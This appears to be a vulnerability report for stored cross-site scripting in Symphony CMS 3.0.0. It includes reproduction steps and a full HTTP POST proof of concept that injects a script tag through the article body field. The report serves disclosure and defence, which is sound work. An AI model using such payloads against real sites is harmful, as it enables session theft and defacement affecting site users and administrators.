# Description

`symphonycms/symphony-2` is vulnerable to `Cross-Site Scripting (XSS)` via fields['body'] to appendSubheading in events\event.publish_article.php

# Steps to reproduce the behavior:
```
1. Login as member
2. Go to 'Articles'
3. Submit malicious content
4. Anyone (inclued admin) view article and XSS excuted
```
Expected behavior
`When admin or user view content, a pop-up will be displayed`

Affected componets:
`events\event.publish_article.php in Symphony CMS 3.0.0 allows XSS via fields['body'] to appendSubheading`

# POC:
```
POST /symphonycms/symphony/publish/articles/new/ HTTP/1.1
Host: target
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,vi-VN;q=0.8,vi;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://target/symphonycms/symphony/publish/articles/new/
Content-Type: multipart/form-data; boundary=---------------------------17679481844164416353626544932
Content-Length: 1111
Origin: http://target
Connection: close
Cookie: PHPSESSID=b21qllug0g7ft80ueo3bn0bgcd;
Upgrade-Insecure-Requests: 1
-----------------------------17679481844164416353626544932
Content-Disposition: form-data; name="xsrf"
vr-i2mWs18DPjVmZ8z2nB-Gb3hdyrb
-----------------------------17679481844164416353626544932
Content-Disposition: form-data; name="MAX_FILE_SIZE"
5242880
-----------------------------17679481844164416353626544932
Content-Disposition: form-data; name="fields[title]"
TEST XSS
-----------------------------17679481844164416353626544932
Content-Disposition: form-data; name="fields[body]"
<script>alert('XSS')</script>
-----------------------------17679481844164416353626544932
Content-Disposition: form-data; name="fields[date]"
08/28/2020 5:55 am
-----------------------------17679481844164416353626544932
Content-Disposition: form-data; name="fields[categories][]"
2
-----------------------------17679481844164416353626544932
Content-Disposition: form-data; name="fields[publish]"
yes
-----------------------------17679481844164416353626544932
Content-Disposition: form-data; name="action[save]"
Create Entry
-----------------------------17679481844164416353626544932--
```
